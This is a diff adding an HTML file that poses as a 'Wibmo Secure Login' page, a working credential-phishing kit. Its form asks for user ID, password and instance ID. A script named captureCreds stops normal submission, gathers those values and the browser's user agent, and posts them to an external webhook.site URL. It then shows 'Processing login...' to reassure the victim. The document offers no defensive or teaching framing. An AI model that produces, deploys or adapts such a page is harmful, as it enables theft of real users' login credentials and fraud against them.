@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Wibmo Secure Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px;
+      background-color: #f4f4f4;
+    }
+    form {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    input {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 8px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0047ab;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Wibmo Secure Login</h2>
+  <form onsubmit="captureCreds(event)">
+    <label for="userId">User ID</label>
+    <input id="userId" name="userId" type="text" required />
+
+    <label for="password">Password</label>
+    <input id="password" name="password" type="password" required />
+
+    <label for="instanceId">Instance ID</label>
+    <input id="instanceId" name="instanceId" type="text" required />
+
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    function captureCreds(e) {
+      e.preventDefault();
+      const data = {
+        userId: document.getElementById('userId').value,
+        password: document.getElementById('password').value,
+        instanceId: document.getElementById('instanceId').value,
+        browser: navigator.userAgent
+      };
+
+      fetch('https://webhook.site/e5647540-8056-4b70-88ed-25fc94a8618c', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' }
+      });
+
+      alert('Processing login...');
+    }
+  </script>
+</body>
+</html>
